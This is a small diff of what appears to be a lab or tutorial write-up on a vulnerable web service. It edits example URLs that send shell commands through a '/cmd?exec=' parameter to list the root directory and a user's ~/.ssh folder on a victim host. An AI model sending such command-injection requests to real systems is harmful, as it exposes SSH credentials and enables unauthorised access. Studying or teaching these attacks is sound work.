@@ -157,7 +157,7 @@ http://<victim>:5000/secret
 
 ```
 http://<victim>:5000/cmd?exec=ls%20-l%20/
-[http://localhost:5000/cmd?exec=ll%20.ssh%20/"](http://3.96.142.208:5000/cmd?exec=ls%20-l%20~/.ssh)
+http://localhost:5000/cmd?exec=ll%20.ssh%20/"](http://3.96.142.208:5000/cmd?exec=ls%20-l%20~/.ssh
 ```
 
 ---
